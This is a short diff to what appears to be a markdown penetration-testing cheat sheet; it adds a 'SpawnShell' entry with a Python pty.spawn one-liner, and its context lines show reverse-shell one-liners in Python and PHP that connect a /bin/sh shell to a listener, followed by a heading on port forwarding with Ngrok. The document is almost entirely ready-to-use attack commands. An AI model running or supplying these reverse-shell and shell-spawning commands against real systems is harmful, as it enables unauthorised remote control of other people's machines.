@@ -65,6 +65,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 php -r '$sock=fsockopen("127.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+**SpawnShell**
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
 # Port Forwarding
 **Install And Setup Ngrok**
 ```
